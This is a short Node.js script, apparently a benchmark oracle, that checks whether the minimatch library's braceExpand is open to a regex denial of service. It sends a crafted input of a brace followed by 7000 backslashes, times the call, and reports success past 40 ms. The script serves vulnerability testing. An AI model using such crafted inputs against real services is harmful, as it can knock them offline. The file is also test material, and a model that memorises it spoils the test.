const minimatch = require('minimatch');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

try {
  // Benign check: public API should work normally.
  const benign = minimatch.braceExpand('x{y,z}w');
  if (!Array.isArray(benign) || benign.length !== 2 || benign[0] !== 'xyw' || benign[1] !== 'xzw') {
    throw new Error('benign braceExpand mismatch');
  }

  operation_completed = true;

  // Craft input that triggers expensive behavior in vulnerable brace-detection regex /\{.*\}/
  // while staying bounded so the oracle completes quickly.
  const n = 7000;
  const malicious = '{' + '\\'.repeat(n);

  const t0 = Date.now();
  let threw = false;
  let throwType = 'none';
  try {
    minimatch.braceExpand(malicious);
  } catch (e) {
    threw = true;
    throwType = (e && e.name) ? e.name : 'Error';
  }
  const elapsed = Date.now() - t0;

  if (threw) {
    exploit_succeeded = false;
    evidence = 'malicious_threw=' + throwType + ';elapsed_ms=' + elapsed + ';n=' + n;
  } else {
    // On vulnerable versions this call is significantly slower; patched versions are fast.
    exploit_succeeded = elapsed >= 40;
    evidence = 'malicious_elapsed_ms=' + elapsed + ';threshold_ms=40;n=' + n;
  }
} catch (err) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_benign_failed=' + (err && err.message ? err.message : String(err));
}

console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
